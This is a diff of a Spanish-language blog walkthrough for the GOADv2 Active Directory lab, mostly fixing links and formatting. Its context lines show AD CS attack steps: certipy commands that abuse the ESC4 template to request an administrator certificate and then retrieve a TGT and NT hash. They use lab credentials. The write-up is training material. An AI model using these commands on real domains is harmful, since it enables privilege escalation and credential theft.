@@ -44,10 +44,10 @@ Un agradecimiento a [M4yFly](https://twitter.com/M4yFly){:target="_blank"} por c
     1. [ESC8 - coerce to domain admin](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#esc8---coerce-to-domain-admin)
     2. [ESC8 - con certipy](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#esc8---con-certipy)
     3. [ADCS enumeración con certipy y bloodhound](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#adcs-enumeraci%C3%B3n-con-certipy-y-bloodhound)
-    4. [ADCS - ESC1](V2%203228f321aac9449ba3f7809af01821b5.md)
-    5. [ADCS - ESC2 & ESC3](V2%203228f321aac9449ba3f7809af01821b5.md)
-    6. [ADCS - ESC4](V2%203228f321aac9449ba3f7809af01821b5.md)
-    7. [ADCS - ESC6](V2%203228f321aac9449ba3f7809af01821b5.md)
+    4. [ADCS - ESC1](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#adcs---esc1)
+    5. [ADCS - ESC2 & ESC3](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#adcs---esc2--esc3)
+    6. [ADCS - ESC4](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#adcs---esc4)
+    7. [ADCS - ESC6](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#adcs---esc6)
     
 ---
 
@@ -3779,7 +3779,7 @@ Luego, se selecciona la entrada relacionada con PKI y se cambia a la pestaña de
     [*] Saved JSON output to '20230907210109_Certipy.json'
     ```
     
-    Se corre el BloodHound modificado,,  [ly4k - BloodHound](https://github.com/ly4k/BloodHound/releases) y se carga el archivo .zip. Una vez cargado, se procede a la sección PKI - Find Misconfigured Certificate Templates (ESC1)
+    Se corre el BloodHound modificado, [ly4k - BloodHound](https://github.com/ly4k/BloodHound/releases){:target="_blank"} y se carga el archivo .zip. Una vez cargado, se procede a la sección PKI - Find Misconfigured Certificate Templates (ESC1)
     
     ![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%2030.png)
     
@@ -4074,7 +4074,7 @@ El comando anterior proporciona como resultado un archivo .json con la configura
 ESC4.json
 ```
 
-Se solicita el certificado para el usuario administrator con el comando: **`certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC4 -ca ESSOS-CA -upn administrator@essos.local`**
+Se solicita el certificado para el usuario administrator con el comando: `certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC4 -ca ESSOS-CA -upn administrator@essos.local`
 
 ```jsx
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC4]
@@ -4089,7 +4089,7 @@ Certipy v4.7.0 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
 
-Se obtiene el Ticket Granting Ticket (TGT) y se recupera el hash NT con el comando: **certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12**
+Se obtiene el Ticket Granting Ticket (TGT) y se recupera el hash NT con el comando: certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
 
 ```jsx
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/ESC4]
